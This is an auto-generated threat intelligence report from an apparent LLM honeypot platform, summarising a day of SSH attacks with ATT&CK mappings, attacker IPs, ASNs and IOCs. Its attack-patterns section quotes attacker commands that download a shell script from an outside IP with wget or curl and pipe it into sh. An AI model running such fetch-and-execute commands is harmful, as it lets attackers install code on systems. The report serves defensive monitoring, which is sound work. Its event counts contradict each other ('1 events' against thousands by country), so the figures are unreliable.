# Threat Intelligence Report

**Generated**: 2026-04-07 03:36 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **1 events** from **508 unique source IPs** across **30 countries** and **34 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 1 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 508 |
| Atomic Attack Patterns | 5 |
| MITRE ATT&CK Techniques | 3 |
| Generated Sigma Rules | 1 |
| Generated YARA Rules | 1 |
| Generated Suricata Rules | 0 |
| Blocked IPs (Firewall) | 252 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1105 (Ingress Tool Transfer) | | 2 |
| T1082 (System Information Discovery) | | 1 |
| T1059.004 (Unix Shell) | | 1 |

### Tactics Distribution

- **command_and_control**: 2 events █
- **discovery**: 1 events 
- **execution**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 3,214 |
| Bulgaria | 560 |
| France | 374 |
| Germany | 269 |
| The Netherlands | 160 |
| United Kingdom | 147 |
| Portugal | 113 |
| China | 92 |
| Russia | 70 |
| Pakistan | 51 |
| Singapore | 50 |
| Hong Kong | 49 |
| Japan | 33 |
| Canada | 29 |
| Malaysia | 24 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| DigitalOcean, LLC | 2,142 |
| ColocaTel Inc. | 534 |
| Google LLC | 386 |
| Modat B.V. | 369 |
| Alibaba US Technology Co., Ltd. | 215 |
| Censys, Inc. | 192 |
| Vpsvault.host Ltd | 184 |
| Tube-Hosting | 162 |
| Amazon.com, Inc. | 115 |
| Microsoft Corporation | 92 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 85 |
| Hurricane Electric LLC | 76 |
| Zenlayer Inc | 67 |
| LLC Applied Computational Technologies | 65 |
| CHINA UNICOM China169 Backbone | 63 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `157.230.235.42` | 1,260 | Attacker |
| `165.245.172.231` | 745 | Attacker |
| `85.11.167.11` | 509 | Attacker |
| `185.91.127.85` | 162 | Attacker |
| `45.205.1.110` | 98 | Attacker |
| `165.245.163.7` | 75 | Attacker |
| `45.205.1.5` | 63 | Attacker |
| `92.110.87.38` | 63 | Attacker |
| `139.135.40.201` | 50 | Attacker |
| `182.119.63.172` | 50 | Attacker |
| `85.217.140.41` | 37 | Attacker |
| `81.29.142.100` | 35 | Attacker |
| `85.217.140.50` | 35 | Attacker |
| `85.217.140.44` | 34 | Attacker |
| `85.217.140.40` | 32 | Attacker |
| `85.217.140.7` | 31 | Attacker |
| `81.29.142.6` | 30 | Attacker |
| `85.217.140.23` | 24 | Attacker |
| `85.217.140.52` | 24 | Attacker |
| `85.11.167.2` | 22 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 508 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [1x] `uname -a`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 1 | `sigma/*.yml` |
| YARA (Payload) | 1 | `yara/*.yar` |
| Suricata (IDS/IPS) | 0 | `suricata/honeypot.rules` |
| Firewall (iptables) | 252 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*